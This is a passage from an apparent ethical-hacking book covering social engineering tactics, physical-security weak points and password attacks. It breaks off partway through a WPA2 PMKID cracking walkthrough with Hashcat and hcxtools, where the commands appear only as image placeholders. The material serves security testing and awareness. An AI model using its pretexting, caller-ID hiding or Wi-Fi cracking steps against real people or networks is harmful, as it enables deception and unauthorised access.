After learning more about social engineering, you can devise certain techniques that will come in handy when ensuring that your organization’s network is secure. Social engineering can also harm the reputation of certain individuals since it involves a collection of people’s personal information. The reputation of different people may be at stake since the external hackers will focus more on obtaining some confidential information about these people. It is good to proceed with caution and that you should have thought about the consequences of your actions before you can act.

There are numerous ways through which you can conduct a social engineering attack. In this book, we will not focus on training people about how to carry out social engineering attacks. The main focus will be on some of the social engineering techniques that have proven to be fruitful as in the case of different external attackers. You can also use some of these techniques so that they may suit your situation depending on your needs.

If you want to carry out some of these techniques within your organization, you may want to act as an outsider, but the main issue may be that most of the people within the company know you. Recognition is a major risk. In some instances, it is good to outsource some of these services from trusted individuals so that they can conduct some of these tests on your behalf. The individuals handling the testing process should also be trusted. If you are seeking the services of an outsider, you may start by seeking references. After that, background checks may come in handy.

Reasons Why External Attackers Use Social Engineering

Most of the external hackers use social engineering attacks because they can. They want to make sure that the network hacking process is as easy as possible. When a social engineer is determined to hack into a network, they will get past the access controls, firewalls, and each of the present authentication devices. In most cases, social engineers act slowly since they want to avoid getting caught. Also, they do not want to raise any form of suspicion. The social engineers will always gather small bits of information progressively and they will use all this information to create a bigger picture depending on the type of attack that they are planning. It is possible to carry out a personal attack through an e-mail or a phone call. The methods used during a social engineering attack normally depend on the abilities of the attacker.

Social engineers are also conversant with the fact that some of these organizations do not have formal data classifications, incidence response plans, access control systems, and security awareness programs. They will always take advantage of such weaknesses, and they will exploit them to their advantage. Social engineers also possess some bits of information about the organization both internally and externally. The knowledge they possess helps them to facilitate each of these attacks.

When a social engineer gathers a lot of information about an organization, they can easily pose as employees or any other trusted individuals within the organization. The knowledge that a social engineer possesses will give them an upper hand and will have an in-depth understanding of how the employees within the organization operate.

Understanding the Consequences of Social Engineering

Many organizations have competitors. Some of these competitors may turn into enemies at some point; these enemies may also see it fit to cause some trouble through social engineering. Besides competitors, the enemies may also be in the form of former employees or people currently working within the organization. At times, a hacker may carry out a social engineering attack since they want to prove their expertise.

Regardless of the person causing the trouble, the main factor to consider is that each organization is always at risk. The Internet can facilitate the information gathering process while also facilitating different types of attacks. The most vulnerable companies are the widespread ones; nevertheless, the networks in smaller companies may also be attacked. Each of the employees within the organization may also be victims of social engineering attacks regardless of their position within the organization. As for the help desk employees, they are highly vulnerable since they are tasked with issuing different pieces of information.

All social engineering attacks have different consequences. The main objective of the attack is to gather the information that will also be used to attack the network in an organization. A social engineer can effectively gather the following bits of information:

*   > User passwords

*   > Security badges that can be used to access the computer room

*   > Intellectual property

*   > Confidential financial reports

*   > A list of consumers and sales prospects

If any of the listed pieces of information is leaked, the company may undergo some financial losses, employees may be demoralized, there will be some regulatory and legal compliance issues, and clients may also lose their trust in the specific organization. Social engineering attacks are not easily documented and that is why they cannot be easily prevented. The main issue about social engineering attacks is that a lot of methods can be used. The firewalls also create a sense of security that is false.

As for social engineering, you can never predict the specific method that will be used by the attackers. The best step to take is making sure that you have remained vigilant while also trying to understand the methods used by external hackers. By doing so, you can raise some awareness within the organization.

Carrying Out Social Engineering Attacks

The process of carrying out a social engineering attack is quite simple. Social engineers need to look into some of the organizational processes and also the information systems before they can go ahead and perform an attack. When an attacker has such pieces of information, they can go ahead and formulate their goals since they will be having a sense of direction.

The steps used by social engineers during the attack process are as follows:

1.  > Perform some research

2.  > Build trust

3.  > Exploit some relationships to gain different pieces of information

4.  > Use the information that has been gathered to engage in some malicious attacks

Some of these steps also have many sub-steps and different techniques should be used in the process. Everything depends on the specific attack that is being carried out.

Before an external attacker performs a social engineering attack, they have to formulate different goals. The goals ensure that they are working towards something specific. During the goal formation process, the attacker should ask themselves what they want to achieve as well as what they are trying to hack. At times, the main focus may be on the security badges and server passwords. In some instances, a hacker may be trying to prove their prowess.

Phishing for Information

After a social engineer has come up with some goals, they can start the attack at ease. They will start gathering some information about the victims. To avoid raising any red flags, the social engineers always act slowly. Since information gathering is an important step in social engineering, reinforcing some security measures that may hinder such processes is possible. Regardless of the research method being used by a hacker, the important pieces of information needed during the hacking process include internal phone numbers, a list of employees, and a company calendar.

Using the Internet

The Internet is used as a basic research medium. A lot of information can be accessed using the search engines. What matters most is you need to gather correct keywords. By gathering different pieces of information, you can carry out a social engineering attack. At times, people pay a certain amount of money to some professionals who may carry out a comprehensive background check. The search can allow you to gain access to private and public information about specific people.

Dumpster Diving

Dumpster diving is risky to some extent and is also messy; nevertheless, it is very effective when looking for specific pieces of information. When using this method, you will have to ravage through trash cans while looking for information about a specific firm. Dumpster diving can also allow you to gain access to some confidential pieces of information since the employees may try to assume that, when some information is sent to the trash can, it is not accessible by other individuals. Everything that you throw away may harbor some important pieces of information. A social engineer will always look for the following types of documents:

*   > Organizational charts

*   > Internal phone lists

*   > Employee handbooks in which the main focus will be on the security policies

*   > Password lists

*   > Network diagrams

*   > Spreadsheets and reports

*   > Meeting notes

*   > E-mail printouts that contain some sensitive information

Paper shredding comes in handy, however, it is only suitable if the papers are shredded into tiny bits that cannot be reassembled. Some shredders shred papers into long strips. The social engineers will always assemble these papers and they will then gain access to some confidential pieces of information. They will just have to spare some time and use some clear tape and the documents will be pieces back together.

A hacker can gather some confidential pieces of information from conversations that also took place in areas such as coffee shops or restaurants. Sensitive pieces of information can also be gathered from the people who also speak loudly when they are conversing over the phone. In some instances, the external attackers also look for the DVDs and CD-ROMs that have been placed in the trash can.

Phone Systems

An attacker can gain access to different pieces of information using the dial-by-name feature that is inbuilt into the voicemail systems. Such a feature can be accessed by pressing 0 after you have contacted the company using a person’s mailbox. Such a trick comes in handy especially during the afterhours. During such hours, there will be no one present to answer your phone calls. Attackers will also use certain techniques to make sure that their identity has been concealed. Some of the techniques used by hackers include:

*   > Residential Phones: Such phones can help to conceal the user’s caller ID. You just have to dial *67 before dialing the specific number that you want to call.

*   > Business Phones: In any business, it may be difficult to spoof when you are using a phone switch. The attacker needs a user guide as well as the administrator passwords for the phone switch software being used within the organization. In some switches, a source number can be keyed in. The number may also be falsified.

*   > VoIP Servers: Many servers can be found as open source and they can also be used to configure any number. The social engineers can find some important pieces of information when using such a technique. The attacker can listen to different pieces of information through podcasts and voicemail messages. They can also study the voices of the victims and they will also be able to impersonate them perfectly when the time comes to visit the organization physically.

Building Trust

Trust cannot be easily gained and it can also be easily lost. Social engineering relies heavily on trust.

People trust each other unless the situation is dire. In most cases, people are kind-hearted, and if they have built some trust amongst each other, some requests may seem reasonable. People like to work together in teams while at the workplace. The main issue is that some of these people do not understand the repercussions that may arise when they issue many pieces of information to a “trusted” source.

Social engineers take advantage of the trust, and they will make sure that they have achieved their goals either way. Some of the social engineers can gain the trust of some of the employees within the organization easily. The social engineers use the following techniques to earn peoples trust:

*   > Likability: It is easy to relate with a nice person and that is why social engineers are friendly. They do not go overboard in any instance so they can easily gain access to the information that they need. Social engineers will also take time to build a relationship with people whom they share common interests. They can use the information that have gained to determine the likes of the victims.

*   > Believability: Social engineers tend to know whether they are likeable or not. Social engineers will always use impersonation to their advantage. They can pose as new employees and they will always approach people that do not know them physically within the organization. They are also very influential and they can do nice things so that they may lure their targets accordingly. At times, they may also pose as team players as they try to build a relationship with some of the employees within the organization.

Exploiting a Relationship

After gaining the trust of some of the employees, the social engineers can easily coerce them to give up different pieces of information that may come in handy during the network hacking process.

Deceit Using Words and Actions

Social engineers will gain access to some inside information from each of their victims by using different techniques. They will initiate a conversation and make sure that the victim cannot suspect anything. If a social engineer makes a sloppy move when carrying out a social engineering attack, they can easily get caught. Some of the red flags include:

*   > Mentioning some names of the prominent employees within the firm

*   > Acting eager

*   > Bragging about the authority they have within an organization

*   > Issuing certain threats

*   > Acting nervous (the body language tells a lot and it can easily give them away)

*   > Experiencing different psychological changes

*   > Placing some emphasis on certain details

*   > May appear like they are being rushed

*   > Refusal to issue some information

*   > Volunteering to issue different pieces of information while also answering some questions that they have not been asked

*   > Having access to some pieces of information that cannot be accessed by outsiders

*   > Asking some queer questions

*   > Using some slang used within the organization

*   > Misspelling some words

A professional social engineer will see to it that they are not sloppy and they will conceal their motives. They have accorded the victim a favor first and they will, in turn, ask for some assistance from the person that they had helped. Such a trick has proven to be very effective. At times, such people also carry out reverse social engineering. They will offer their assistance when it comes to handling a specific problem. After fixing the problem, they can be termed as heroes.

Social engineers mainly target some of the unsuspecting employees and they will ask for a favor. Many people fall into this trap. To the social engineers, impersonation is easy. They have a fake badge and ID so that they can fit easily within the target organization.

Deceit Using Technology

Technology makes sure that some things are easier especially for social engineers. Some of the malicious requests are issued through a computer or any other electronic device. It is also easy to spoof details such as e-mail addresses, computer names, network addresses, and fax numbers.

Hackers can easily deceive their targets using technology. They can use e-mails while asking victims for some critical information. The social engineers usually attach links to these e-mails and the victim will be redirected to a website that looks legitimate and presentable. Some of the pieces of information that can be accessed using the above technique include passwords, user IDs, and social security numbers. The external attackers may also use such a technique on platforms such as Myspace and Facebook.

Some of the phishing and spam messages make use of such a technique. The users are forced to let their guard down using different techniques, and they may end up opening some of the attachments. The e-mails are also presented professionally. A victim is duped into disclosing different bits of information. A hacker will always deploy some of these social engineering techniques after they have accessed the network so they can easily send some messages and create some pop-up windows. Some of these tricks can also be used when engaging in cellphone messaging. In some instances, the external attackers will pose as Microsoft employees, posing as a vendor. After the victim has installed the “patch,” their computers will be infected by different programs such as Trojans and worms. The attacker can then gain access to different pieces of information by creating a backdoor within the network. The backdoor will allow the attacker to gain access to different pieces of information freely using the victim’s computer and they can also launch different attacks. The worms and Trojans can come in handy when performing a social engineering attack.

There are different types of worms. After the victim opens some of the spam emails, it will be too late. The computer will be already infected and they will not achieve what they initially wanted. Some of the social engineering attacks that are conducted using technology are performed anonymously. The attacker will make use of an Internet proxy server, remailers, anonymizers, and some SMTP servers to make sure that there is an open relay. When people become victims of instances whereby they are supposed to issue some personal information that is also confidential, they should know that they cannot track the source of the social engineering attack.

How to Counter Social Engineering Attacks

There are different ways through which you can safeguard your network from a social engineering attack. Although the security systems may also be strong, some of the naïve network administrators may be manipulated by the social engineer.

Some security policies can ensure that social engineers cannot access the network, and they include:

> ✓  Data classification

> ✓  Setting up user IDs for all the employees and contractors

> ✓  Getting rid of the IDs of the employees who are no longer working within the organization

> ✓  Establishing acceptable computer usage

> ✓  Resetting and also setting password

> ✓  Handling confidential information appropriately

> ✓  Responding to some security incidents accordingly

> ✓  Escorting guests

Some of these policies can be enforced for all the employees within the organization. The policies should also be kept up to date for all the individuals within the organization. The end-users should also be notified about some of the policy changes.

The best line of defense when trying to prevent a social engineering attack is to have well-trained employees who know how they should respond to different social engineering attacks. By ensuring that you have raised awareness, it is possible that the social engineering attacks do not take place. During the training process, the focus should be more on some of the security policies. You can also outsource the security training services. The employees should also take security training seriously. Some of the tips that can help you to get rid of social engineering attacks on a long-term basis include:

*   > Security awareness and training should be termed as a business investment.

*   > The users should also be trained to be always aware of some of the security policies.

*   > Ensure that the employees are responsible for some of the privacy and security tasks within the company.

*   > Ensure that the training content has been tailor made depending on the needs of your organization.

*   > Come up with a social engineering awareness program that also aligns with your business functions.

*   > Make sure that your messages are non-technical.

*   > Come up with incentive programs for reporting and preventing some incidents.

*   > Always lead by example.

There are also some tips that you can share with the employees within the company:

*   > You cannot share some confidential bits of information with other people unless you can verify that they are indeed who they claim to be. At times, a request can be made through a phone call in such an instance, you should verify the identity of the caller first.

*   > Do not click any e-mail links that will redirect you to a website that needs to be updated. Some of these emails are usually from some sources that cannot be trusted.

*   > Always be cautious when sharing some confidential information on different sites including LinkedIn and Facebook. Always be on the lookout for people who claim to be your “friends”. Some of them may have some malicious motives.

*   > Never open an e-mail attachment from a total stranger.

*   > Escort each of the guests within the building.

*   > Do not give out any of your passwords.

Other suitable suggestions include:

*   > Strangers should not easily access your network regardless of whether it is wired or wireless. An attacker can place some malware and a network analyzer into the network after accessing it for a few seconds.

*   > All information should be classified. The employees should also be trained on how to handle different pieces of information.

*   > Develop some policies that are supposed to enforce the media and documents on the computer. The policies will make sure that the data can be handled carefully and it will also stay where it should be.

*   > The preferred paper shredded should carry out cross-shredding. There are some companies that carry out paper shredding and they offer quality services.

Some techniques that come in handy when reinforcing the content on formal training include:

*   > The training launches and the employee orientation

*   > Brochures that contain some information about how to survive social engineering attacks

*   > Trinkets that can also be used as mouse pads screen savers, and sticky notes

> Chapter 6: Physical Security

In this chapter, the main focus will be on:

> ➢  Learning about the importance of physical security

> ➢  Looking for different vulnerabilities

> ➢  Implementing some countermeasures in case of an attack

Physical security entails protecting physical forms of property. The focus should be on the nontechnical and technical components.

Physical security is overlooked in some instances and it is an important aspect of information security programs. If you can secure your site physically, you can also easily secure different pieces of information. In this chapter, we will discuss some of the present physical security weaknesses and their relation to information and computer network security. Some of the suitable countermeasures will also be outlined and they will help to minimize the physical vulnerabilities within your business. When carrying out a physical security test, you should break into the system. It is good to use the perspective of an outsider. During the testing phase, you can also discover some security loopholes that need to be sealed.

Physical Vulnerabilities

Regardless of the technology used on your computer network, it may be hacked using different techniques and that is why we are looking into some of the physical security vulnerabilities and how they can be fixed so that external attackers cannot exploit some of these loopholes. Some of these physical vulnerabilities may not be a major issue in some of the small companies. The factors influencing different physical vulnerabilities include:

*   > The number of buildings

*   > The size of the building

*   > The population of employees

*   > The places where the exit points are located

*   > The placement of confidential pieces of information

Many physical security vulnerabilities exist. The external attackers will always be on the lookout for some of these physical vulnerabilities. To stay safe, you should look for these physical vulnerabilities first. After that, you can look for a suitable solution to these security issues. Some of the physical vulnerabilities that are present within organizations include:

*   > The lack of a receptionist

*   > Failure to escort visitors within the building

*   > Some of the employees may trust some visitors since they may be wearing vendor uniforms and they may also claim that they are there to work on some issue in the computer room.

*   > The doors may lack access controls.

*   > Security footage may be accessible through the network.

*   > The computer room may be easily accessed by the public.

*   > Doors are propped open.

*   > The backup media may be stored recklessly.

*   > There may be unsecured laptops and other computer hardware.

*   > The DVDs and CDs that contain some sensitive information may be disposed recklessly into the trash can.

When some of the physical security vulnerabilities are exploited, some bad things may happen eventually. The main issue is that some unauthorized personnel may have access to the building. After the intruders enter the building, they can access the computer room, and the organization’s network will be compromised in the process. The unauthorized users may also steal some pieces of information and they will use the information to their advantage.

The external attackers will also take advantage of all the physical vulnerabilities, including the weaknesses that may be present in the office layout, the infrastructure of the building and the computer room design. In some instances, you should also consider some factors such as the proximity of the building to amenities such as a police and fire station. The crime statistics in the area also matter since they will ensure that you can understand what you are up against.

When assessing the physical security within a company it is also good to consider some of the vulnerabilities that have been discussed in this context. The assessment process will not require any expensive tools or equipment. Additionally, the technical expertise you possess will also not act as a hindrance during the physical security assessment process. As for large facilities, the assessment period may take a lot of time. You need to be practical during the assessment process.

Building Infrastructure

Some of the critical components of a building include windows, doors, and walls. It is good to consider the infrastructure of the computer room since some of the sensitive pieces of data are stored there.

Attack Points: The external attackers will take advantage of some of the building infrastructure vulnerabilities. Some of the attack points that should be overlooked include:

*   > Are the doors opened? If yes, why are they opened?

*   > Can any device fit through some of the door gaps present in the doors at the computer room? Also, how can the sensors be triggered in the computer room?

*   > Is it easy to open some of the doors?

*   > Which materials were used during the construction of the computer room? Are the walls of the computer room strong enough? Is the material used during the construction process resistant to calamities such as earthquakes?

*   > Are the windows or doors made of glass? Where are the hinges placed? Which type of glass has been used during the construction process?

*   > Is there a state of the art alarm system attached to the windows and doors within the building?

*   > Are there any drop ceilings? Are there any tiles that can be pushed up?

Assessing the design process makes sure that you can learn more about the present physical vulnerabilities.

Countermeasures: Some of the countermeasures may require carrying out some form of maintenance. You can hire some experts who will assist you during the building design process and the construction phase. Some of the best techniques to ensure that the security within your building is top-notch include:

*   > Use strong doors and locks.

*   > Ensure that the alarm system is being monitored continuously. Some network-based CCTV cameras should also be placed in all the access points.

*   > The computer room should have walls that do not have windows.

*   > The exit points should have proper lighting.

*   > Mantraps should also be placed in some points within the building.

*   > The fence may be made of barbed wire.

Utilities

It is good to consider some of the utilities that will be used in the computer room. Some of these utilities include power, fire suppression, and water. Such factors should always be considered during the physical security assessment process. Some of these utilities come in handy when fighting a fire incident and also making sure that all the access controls will be up and running despite a power loss incident.

Attack Points: The intruders can exploit some of the vulnerabilities that are utility-related. Some of the common attack points that are normally overlooked include:

*   > The power-protection equipment including the generators and surge protectors. At times, they may be quite accessible and the external attackers may switch them on and off easily.

*   > When there is a power failure, which are the physical security mechanisms that have been put in place? Always assess whether the physical security mechanisms are working well since people may easily access the computer room when there is a power failure.

*   > Which fire suppression and detection devices are being used and where are they located? Some of these devices include fire extinguishers, alarm sensors, and sprinkler systems. Always determine whether an external attacker can manipulate each of these devices.

*   > Where are the gas and water shutoff valves situated? Can they be accessed easily?

*   > Are the local telecom wires running outside the building situated above or below the ground? Depending on their location, can someone tap into the telecom wires? Can any digging activity damage the telecom wires? If the telecom wires are situated on telephone poles, are they vulnerable to traffic accidents that may displace them?

Countermeasures: It is good to involve some experts during the physical vulnerabilities assessment period. They will also help during the design process. The major placements include:

*   > The location of the major utility controls. They should be located in closed doors that are also lockable.

*   > Can the controls be accessed easily by anyone in the building? The covers for the on and off switches act as effective defense mechanisms.

Office Layout and Usage

The design of the office and the usage can come in handy when ensuring that there is physical security.

Attack Points: The external attackers will take advantage of some of the office vulnerabilities. Some of the attack points that should be considered include:

*   > Look into whether the security guard or the receptionist monitors the traffic within the building.

*   > Do the employees possess any confidential information that is placed on their desks? Are their mails and different packages left around lying around such that they can be easily accessed by other external parties?

*   > The location of the trash cans also matters. The dumpsters should not be easily accessed by external parties. Also, are there are shredders within the office?

The external attackers will always carry out dumpster diving when looking for some information that may have been disposed recklessly. They will always look for memos and phone lists. Dumpster diving is dangerous since it may expose your company badly.

> ✓  Are the copy and mail rooms secure?

If an external attacker can easily access these rooms, they can steal some important pieces of information and they will use it against you.

> ✓  Are the CCTV cameras being monitored on a full-time basis?

> ✓  Which access controls are present on the windows and doors? Which security measures have been deployed? If there are regular keys, who can access them?

Different users normally share some pieces of information including the programmable keypad combinations. There needs to be accountability. Always make sure that you have kept track of the number of people that have used certain keys and combinations.

Countermeasures: There are some measures that can be implemented to reduce the exposure of your organization and they include:

> ✓  The security guard and receptionist should keep track of the people entering and exiting the building. Such a countermeasure is critical. Make sure that each visitor has signed the register. Also, some of the people who cannot be trusted should also be escorted.

Enforce some policies whereby the employees should always question the strangers while also reporting any strange behavior that has been taking place in the building. Some signs showcasing Employees Only should also be put in place.

> ✓  There should be a single entry and exit point within the building.

> ✓  CCTV cameras

> ✓  The dumpsters should be placed in secure areas.

> ✓  It is advisable to use the cross-cut shredders when getting rid of hard copy documents that contain some sensitive information.

> ✓  The number of passcode combinations should also be limited.

> ✓  The biometrics identification system should also be effective.

Network Components and Computers

After an external attacker has gained physical access to the target’s building, they will start by looking for the computer room. They will also look for any available computer devices.

Attack Points: After gaining access to the computer room, the external attacker will go ahead to penetrate the network when using different techniques. A malicious attacker can carry out the following acts:

> ✓  Obtaining access to the network and sending spam emails while acting as a logged-in user working in the organization.

> ✓  Cracking and obtaining passwords directly from a computer after the booting process. Some of the tools that can be used to crack passwords include Ophcrack Live CD.

> ✓  Stealing files from the computers and the external attacker will make use of a removable storage device.

> ✓  Entering a computer room that is unlocked and also tampering with the firewalls and the servers as well as network devices such as routers.

> ✓  Walking out with the contact lists network diagrams, and some incident-response plans.

> ✓  Obtaining phone numbers and such information can be used to carry out an attack in the future.

The external attacker can gain access to all the encrypted pieces of information on the network. They can analyze the information in the future using the following techniques:

> ✓  Connecting a network analyzer to a device such as a router

> ✓  Ensuring a network analyzer is connected to an existing computer in the organization.

> ✓  The remote administration software also come in handy.

> ✓  Some attackers also have the ability to bind a public IP address to the computers only if they are outside the firewall. Some experienced hackers can also configure the firewall rules to suit their needs.

> ✓  Can a computer be accessed on a regular basis? Is it possible to access the computer during the business after hours?

> ✓  Are the routers firewalls and switches mounted in lockable racks?

> ✓  Are the laptops stored in desks that have secured locks? Are the hard drives encrypted?

> ✓  Are the passwords stored in easily accessible areas such as sticky notes on the desktop?

> ✓  Is the backup media stored in safes? Are the safes well rated such that they cannot melt when there is a fire incident? Who can access the safe?

> ✓  Is the backup media on the computer susceptible to theft?

Are other technological gadgets such as smartphones unsecured? The devices have some value, and the external attackers will make sure they will gain access to each of these devices. Some of these devices are not protected by some of the security protocols within the organization. Each of these devices such that even an external attacker will have a hard time trying to gain access to the information present in these devices. Some of the major factors to consider include:

> ✓  Can the wireless access point signal be easily accessed? If it is not secure, make sure that you can configured the necessary security protocols.

> ✓  Can the routers, firewalls, hubs, and switches be easily accessed? Such considerations are important so that the network cannot be easily accessed by external attackers.

> ✓  Are there cable traps to ensure that the network cables cannot be unplugged by the hackers?

Countermeasures: Some of the mentioned countermeasures are easy to implement; nevertheless, they may be difficult to enforce since a person is supposed to make a follow up frequently. Here are some insights:

> ✓  They require you to lock your screen after leaving your computer.

> ✓  Always use strong passwords.

> ✓  The laptop users should store their laptops well so that they cannot be accessed by third parties.

> ✓  The entire laptop will require you to use encryption technologies.

> ✓  The computer room should be closed and monitored.

> ✓  An inventory of the software and hardware being used within the organization should be kept.

> ✓  The computer media should be secured using some appropriate techniques.

> ✓  Make sure that all the security loopholes within the network have been sealed.

> ✓  Make use of bulk erasers.

> Chapter 7: Passwords

In this chapter, the discussion will revolve around the following areas:

> ➢  Looking into the password vulnerabilities

> ➢  Examining password hacking techniques and tools

> ➢  Hacking files that have been protected by passwords

> ➢  How to protect the system from password hacking

A hacker can easily gain access to a network through password hacking. They will focus more on the user administrator passwords so that they can easily access the entire network. Some people use strong passwords; a hacker who is determined to hack the passwords regardless of the time it will take to crack the password. In a security chain, a password is the weakest link. In most cases, the passwords rely on secrecy. Once the password is compromised, many people can easily access the network. It is good to make sure that you are accountable for all your passwords.

External attackers can hack your passwords using different techniques. They can access your passwords by asking for them. They can also carry out shoulder surfing. In some instances, the attackers can also use password cracking software. To obtain passwords, the external attackers will make use of keyloggers and network analyzers. In this chapter, you will realize how external attackers can easily gain access to your passwords by penetrating your network. Some of the password vulnerabilities will also be mentioned and the suitable countermeasures will also be outlined. The countermeasures will ensure that external attackers cannot easily exploit your system. If you carry out some of the vulnerability tests and also implement the mentioned countermeasures, you will be able to secure the passwords that can be used to access your network.

Password Vulnerabilities

After balancing the cost of the security and the value of the information within your company, the passwords being used within the company will be adequate. Passwords will issue a false sense of security. The attackers will always try to crack the passwords when they are trying to penetrate the network.

The main issue about relying on passwords to secure valuable pieces of information is that many people will have access to the password. The main issue is that you cannot know a person fully. Also, although a person may know the passwords, they may not be authorized users. There are also two classifications of password vulnerabilities and they include:

1.  > User Vulnerabilities: This classification entails the lack of policies that are meant to protect the passwords. Additionally, the lack of security awareness is also not advisable.

2.  > Technical Vulnerabilities: This involves the use of encryption methods that are weak. Also, the passwords may also be stored unsecurely.

Securing the physical environment is also among the best ways to protect the network passwords. The technique was working well. The main issue is that nowadays computers also have network connectivity and the physical security is now gone.

Organizational Password Vulnerabilities

Convenience matters a lot especially if a person has to remember numerous passwords at a go. The passwords are hard to maneuver and external attackers experience many challenges during the password cracking process. The main advantage that attackers have is that people normally come up with passwords that they can remember easily. They always come up with different combinations until they come across the correct password. After that, they can

access the network easily.

The users should be educated and also reminded about the importance of using strong passwords. The main problem is that some users come up with passwords that are easy to guess. Users rarely change their passwords. The passwords are reused to secure numerous points within the network. After an attacker gains access to a password hat has been reused, they can access many points within the system. They may be written down in places that are not secure. Difficult passwords cannot be easily cracked. The main issue is that when a person comes up with a complex password, there is a high likelihood that they will write it down. When the attackers gain access to these passwords, they will go ahead and use such information against you.

Technical Password Vulnerabilities

After exploiting some of the organizational password vulnerabilities, you may also find some technical vulnerabilities and they include:

*   > Weak password encryption schemes. The hackers can use some strong mechanisms to crack weak passwords. In this chapter, we will also discuss more about some of the techniques used by external attackers to crack passwords. There are many vendors who believe that passwords are usually safe as long as they have not published the source code that they have used during the formulation of the encryption algorithms. Some of the patient hackers who are also persistent will take their time to crack each of the security protocols as fast as they can. After cracking the code, they will take advantage of the weak encryption.

*   > Programs that normally store the passwords in unsecured files and databases that are easily accessible.

*   > The user applications that normally display the passwords on the screens when a person is typing.

Cracking Passwords

The external attackers enjoy the password hacking process. They mainly enjoy the sense of exploration that is present during the password cracking process. Although you may not be interested in exploring the passwords of numerous individuals, it is good to approach the hacking process using such a mindset. After obtaining one password, it is easy to gain access to other multiple passwords that can allow you to access the network easily. Most attackers will mainly target the root and administrator passwords.

The administrator passwords are important since they will grant the external attackers more access to the network. As long as you have administrative access, you can manipulate and access anything on the network. When you are looking for the password vulnerabilities within the organization, always start by testing the high access levels such as the network administrator. Most of the attackers will use such a tactic. You can exploit the system in different ways. You can use high and low tech methods. Some of the low tech methods are as follows:

Social Engineering

This is a low-tech method and it is also very popular when it comes to gathering passwords. The social engineering topic has already been covered in previous chapters. As for social engineering, it focuses on exploiting the trusting nature of people. After gaining access to the passwords and other pieces of information, an attacker can go ahead and use such information for their own personal gain.

Techniques: To access a password when using social engineering, you just have to ask for it. Since the technique involves manipulation, you just pose as an employee within the organization and ask for the password using an email or any other technique.

At times, the users can issue their passwords to the individuals responsible for the security testing process. Passwords should always be reset after the testing phase is over. After resetting the passwords, you will not be accountable for any information that may be lost within the network afterward.

Countermeasures: Ensure that you have brought about awareness through security training programs; that way, you can easily ensure that the attacker cannot gather any information through social engineering. The individuals who have access to the network should be trained on how they can spot attackers. For instance, they should know that attackers make use of fake phone calls and spam emails. They should ignore each of these emails. It is also good to notify the security administrator about any suspicious activity such as the presence of some suspicious phone calls.

Shoulder Surfing

This is a technique that involves looking over a person’s shoulder. The attacker will mainly do so in a bid to gain access to the passwords being used to access the network.

Techniques: To coordinate such an attack, the attacker should be close to the target and they will try to conceal their hidden motives. They will collect the password by monitoring the keyboard and the screen of the users as they log in into the network. An external attacker that has a good eye will easily gain access to the password. Shoulder surfing is quite easy and you can also try it on your own.

Countermeasures: Always encourage the users to be on the lookout so that an external attacker cannot gain access to their passwords. They should not key in their passwords whenever they spot some strange activities within their environment. If a person is looking over your shoulder, you should have dismissed them politely. Make sure that they cannot see your password as you type it.

Inference

It is the situation whereby the attacker can guess the passwords depending on the information that they have gathered about the users. Some of the details include the date of birth, phone numbers, and even favorite television shows. The main issue with the external attackers is that they are very determined to achieve their goals.

The best defense mechanism is to educate the users appropriately about the creation of secure passwords that do not also relate to some personal information such as the date of birth. The users should also be reminded constantly about the importance of secure password creation.

Weak Authentication

Malicious users and external attackers will try to obtain passwords through different means. They may also take advantage of some of the past operating systems since they do not require any passwords during the login process. Some phones are not secured using passwords.

High-Tech Password Cracking

High-tech password cracking entails the use of different programs to guess the passwords that can be used to access the network. The tools ensure that it is possible to come up with different password combinations. Some of the high-tech techniques are used to access database files that are protected by passwords. The major password cracking techniques include brute-force attacks, dictionary attacks, and rainbow attacks.

Hacking WPA2 Wi-Fi

The techniques used to crack the WPA2 networks have not changed over the years. The latest techniques require you to interact less and make sure that you are well-informed as compared to some of the previous techniques. You can also access various networks although they may not be connected. WPA2 network can be accessed using the PMKID. Some of the tools that you can use include Hashcat. The tool will enable you to crack the WPA2 Wi-Fi passwords. Also, when using such tools, you can easily identify some of the networks that have weak passwords.

The Old Techniques Used to Crack the WPA2 Passwords

The old techniques have been used for many years and you should disconnect a connected device momentarily from the access point that you want to crack. As a hacker, you have to understand some of these essential points.

The main challenge is that someone must be connected to the network so that you may launch an attack. The password that has been used should also be weak so that the attacker may break in easily. If there is no connected device, it will be hard to connect to the network since you will lack the opportunity to capture a handshake, and that is why you will be unable to hack into the network.

The other challenge of such a technique is that it is legally troubling and noisy. You will be forced to send some packets intentionally so that you may disconnect an authorized user from the network. You will be launching a DoS attack, and as a result, the network will be jammed. You may also get into trouble since you can be easily caught.

New Methods Used to Hack the WPA2 Wi-Fi

Instead of trying to intercept the two-way communication that is present between two Wi-Fi devices so that you can crack the password, the attacker can use new techniques to communicate directly with a vulnerable access point. Some of the tools that can be used by attackers include Hashcat. The tool can be used to launch a brute-force attack, and it mainly collects information that can facilitate such an attack easily.

As always, the attacker needs to be close to the WPA Wi-Fi network that they are planning to attack. The main objective will be to use a compatible wireless network adapter, and it will be possible to gain access to certain pieces of information that can be used to facilitate the attack. The wireless attack tool has also proven to be more efficient as compared to Aircarck-ng and Aireplay-ng.

Using Hcxtools and Hashcat

Hcxpcaptool and hcxdumptool are tools that are used to carry out penetration testing on Wi-Fi networks and also carrying out an audit. When using these tools, you can easily capture a WPA2 handshake and PMKID hashes. Minimal arguments are required when launching an attack when using the command line. The tool can also be run against some convenient targets. The attack over the SSH can also be executed. Devices such as Raspberry Pi can also be used although they do not have screens.

After capturing the PMKID, the hash should be loaded into the Hashcat in a bid to crack the WPA2 Wi-Fi password. The hcxpcaptool is used to convert the PCAPNG file to a version that can be compatible with the Hashcat. The brute force attempts can then take place.

To attack each network when using this technique could not be possible. The success rate is not as high depending on the complexity of all the passwords on the targeted WPA2 Wi-Fi networks. Various factors determine whether you can access the PMKID.

What Do You Need?

When performing such an attack, you have to use the Kali Linux software. Also, you should be able to access a wireless network adapter and it should also support the packet injection and monitor mode. Many guides come in handy when you are trying to select a compatible wireless network adapter.

Apart from the network adapter offered by Kali Linux, the system should be fully updated and upgraded. Failure to do so, you will find that some of the packages are out of date and some issues during the capturing process will be encountered.

Step 1: Install the Hashcat and Hxctools

First, you should install the tools that you need. To download the necessary tools, key in the following text on the terminal window.

![](images/00006.jpg)

After the installation process is complete, you will then install the hxctools. To do so, open the terminal window and also paste everything line by line. If an error occurs, type the sudo command before the text.

![](images/00007.jpg)

You will then install the Hashcat tool. The process should be easy. Make sure that you have installed the latest version of the Hashcat tool.

![](images/00008.jpg)

Step 2: Preparing the Wireless Network Adapter

